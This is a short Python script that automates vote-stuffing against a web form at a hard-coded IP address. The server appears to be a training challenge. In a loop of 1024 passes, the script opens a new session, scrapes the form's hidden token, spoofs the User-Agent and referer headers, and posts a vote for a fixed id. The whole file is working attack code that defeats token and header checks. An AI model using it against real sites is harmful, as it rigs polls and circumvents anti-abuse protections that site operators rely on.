import requests
from bs4 import BeautifulSoup


poison_data = {"id": "3403", "holdthedoor":"submit", "key":""}

header = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", "referer": "http://158.69.76.135/level2.php"}


for i in range(0, 1024):
    
    hodorsession = requests.session()
    html_website = hodorsession.get("http://158.69.76.135/level2.php")
    souped_page = BeautifulSoup(html_website.text, "html.parser")
    hidden_key = souped_page.find("form", {"method": "post"})
    hidden_key = hidden_key.find("input", {"name": "key"})
    poison_data["key"] = hidden_key["value"]
    hodorsession.post("http://158.69.76.135/level2.php", data=poison_data, headers=header)
    print(i+1)
    